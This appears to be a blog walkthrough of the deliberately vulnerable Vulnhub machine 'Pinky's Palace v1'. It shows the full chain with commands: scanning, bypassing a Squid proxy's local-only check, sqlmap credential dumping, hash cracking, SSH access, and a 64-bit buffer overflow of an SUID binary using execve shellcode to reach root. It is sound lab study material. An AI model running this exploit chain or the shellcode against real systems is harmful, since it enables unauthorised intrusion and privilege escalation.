---
published: false
---
# Pinky’s Palace v1
Vulnhub virtual machine; OSCP prep box, pivoting enumeration through separate web-server to engage the target. Buffer-overflow of an application to gain root.

----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------



  Discover VM on network
    netdiscover -r 192.168.56.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552748200103_image.png)


Target: 192.168.56.117
verified via vm: 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552748211012_image.png)



# Enumeration

Onetwopunch Scan:
this script offers a bit of a change from `nmap` and uses `unicornscan`
added ip to `targets.txt`

    ./onetwopunch.sh -t targets.txt
  (results are saved to ~/.onetwopunch/udir/192.168.56.117-tcp.txt)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552749357620_image.png)


(started freaking out on me. Will have to re-attack as to why?!)

Nmap scan:

    nmap -sV -sC -oA nmap/pinkyv1 192.168.56.117

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552748825062_image.png)


looks as if we have two HTTP servers operating on ports `8080` and `31337`

Nmap scan number 2

    nmap -O -sT -sV -p- -T5 192.168.56.117

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552752182620_image.png)


more of an aggressive scan and found the `ssh` server.


Navigating to first port `8080`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552748934369_image.png)


source:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552748955074_image.png)


looks to be forbidden.

Navigating to port `31337`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552749034172_image.png)


an error page with looks to be some type of application bleed of `squid/3.5.23`.

source:


![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552749123712_image.png)


ok, looks like we are working with `Stylesheet for Squid Error pages` as our application on our web-server

Let move to impersonate a local ip (127.0.0.1) for port `8080` that was refusing connections.


    curl -x http://192.168.56.117:31337 http://127.0.0.1:8080

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552750280157_image.png)


we have just fooled the web-server in thinking the request came from the internal network.

Perform gobuster with a proxy of port `31337`

    gobuster -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-webservices.out -p http://192.168.56.117:31337

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552750808280_image.png)


`/littlesecrets-main` directory discovered. 

added the target ip + port as a proxy and navigated to directory.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552751539414_image.png)


we have a login page

gobuster enumeration of files

    gobuster -u http://127.0.0.1:8080/littlesecrets-main/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -p http://192.168.56.117:31337 -x .php,.bak,.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552752225280_image.png)


discovered `/login.php`, `/logs.php`


Lets try to enter this login page via `sqlmap`

    sqlmap -u http://127.0.0.1:8080/littlesecrets-main/login.php --dbms=mysql --proxy=http://192.168.56.117:31337 --data="user=adm&pass=passw" --dump users --level=5 --risk=3

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552751759637_image.png)


after a bit of time we are able to decode the `pinky_sec_db`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552829310161_image.png)


the hashes look like md5 and with a quick decryption of them at https://www.md5online.org/md5-decrypt.html we have credentials.


    pinky:f543dbfeaf238729831a321c7a68bee4 = [not found on md5online]
    pinkymanage:d60dffed7cc0d87e1f4a11aa06ca73af = 3pinkysaf33pinkysaf3

since it looks like we have a `mange` hash lets try and SSH to box

SSH

    ssh pinkymanage@192.168.56.117 -p 64666

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552830412600_image.png)


sudo -l

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552830448974_image.png)


search for hidden files:


    find ./

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552830650686_image.png)


looks to be an ultrasecret and a note.txt

cat both files:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552830729991_image.png)


we have an rsa key (encoded in base64) and the note confirms said rsa key.

decode rsa key

    cat ./html/littlesecrets-main/ultrasecretadminf1l35/.ultrasecret | base64 -d

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552830895189_image.png)



# Priv-esc

with decoded private key we can now placed the key on our local box `~/.ssh/pinkyv1` and change the `chmod` to 600 and connect to pinky ssh with private key.

    ssh -i ~/.ssh/pinkyv1 pinky@192.168.56.117 -p 64666

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552831182244_image.png)


we are now operating as pinky.

from the home directory we discover this `adminhelper` binary

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552831379996_image.png)


this binary when executed submits an echo and could be vulnerable to an overflow

testing:

    ./adminhelper "test the test"

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552831505425_image.png)


attempting to crash binary

    ./adminhelper $(python -c 'print("A" * 1024)')

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552831565184_image.png)


segmentation fault - exactly what we were looking for to happen.


# Buffer Overflow

This binary also has an SUID bit which will allow us to act as root if executed.


1. we need to find where the application crashes
2. find the offset
3. insert our shell code to take advantage of overflow



1. location of crash

use gdb to figure out what address application crashes at.

    gdb --args ./adminhelper aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552836997314_image.png)


break-main

    break main

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837029235_image.png)


run application

    r

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837107994_image.png)


view registers

    info reg

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837158309_image.png)


this is a 64-bit architecture based off the different register layout.

rip is at main

continue running

    c

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837303629_image.png)


we have reached the segmentation fault - application crash. Our next step would be to determine location of frame pointer.


    x/s $rbp

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837431011_image.png)


this means that the overflow has occurred at `0x61616161616161`

next, examine the stack pointer `$rsp`

    x/s $sp

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552837528293_image.png)


means that “A” exceeded the buffer by 55 times.


examine the “A” sent initially and subtracted 55 from the total

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    
    #aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (subtracted 55)

our remaining number and/or offset = 72

re-run gdb with argv of 72 and additional text to ensure we are filling the `$rsp` with “a” and taking over the `$rsp`

    gdb --args ./adminhelper AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbcdefghi

which is 72 “a”s and “bcdefghi” which should be the “rsp”.

break-main

    break main

run application

    run

continue

    c

crash:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552839452514_image.png)


Disassemble the main

    disassemble

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552839482756_image.png)


we are exploiting this “strcpy” command that is vulnerable to the buffer overflow.

inspect the `$rbp`

    x/s $rbp

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552839534794_image.png)


here are our “A”s 

inspect the `$rsp`

    x/s $rsp

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552839589299_image.png)


here are teh extra bytes we took over the rsp with. We need to inject the shell code into this rsp location!


shellcode payload for x64 systems will result in a shell via push. This is provided by 
link: http://shell-storm.org/shellcode/files/shellcode-806.php 
along with exploit-db
link: https://www.exploit-db.com/exploits/36858

shellcode:

    \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

Leading us to getenv.c

    /* yaojingguo commented on Nov 8, 2016The code is from Page 147 and 148 of Hacking: The Art of Exploitation, 2nd Edition . */                 
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
            char *ptr;
    
            if(argc < 3) {
                    printf("Usage: %s <environment variable> <target program name>\n", argv[0]);                                                  
                    exit(0);
            }
            ptr = getenv(argv[1]); /* get env var location */
            ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */                                                           
            printf("%s will be at %p\n", argv[1], ptr);
    

this try to inject an environment variable into the program. Use this script to find an injectable address

Create an variable via export with shellcode from above. In the end this will return the exploit address of the shell code.

    export SHELLCODE=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`

see the variable created in env

    env

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552840405389_image.png)


after compiling the getenv.c to an application we will execute the variable within the application

    ./getenv SHELLCODE ./adminhelper

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552840526543_image.png)


results in our shellcode being placed at `0x7fffffffed68`


# Root

next, we run the ./adminhelper with our initial payload of “A” and add our return address to our shellcode in little  little endian format.


    ./adminhelper AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\xed\xff\xff\xff\x7f
    
    or use python
    ./adminhelper `python -c 'print "A"*72+"\x68\xed\xff\xff\xff\x7f"'`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552841246666_image.png)


our shellcode executes and successful buffer overflow occurs dropping us into a root shell due to the SUID bit on the `./adminhelper`

upgrading the shell to full.

    python -c 'import os; os.setuid(0);os.setgid(0);os.system("/bin/bash")'

![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552841502181_image.png)


flag `/root/root.txt`


![](https://d2mxuefqeaa7sj.cloudfront.net/s_29DA7847DA9F5D7FD23319910669BFE652E62C63CA3F9838830C6C3BAEA7FEAE_1552841564182_image.png)


Bring me the root!

-exec

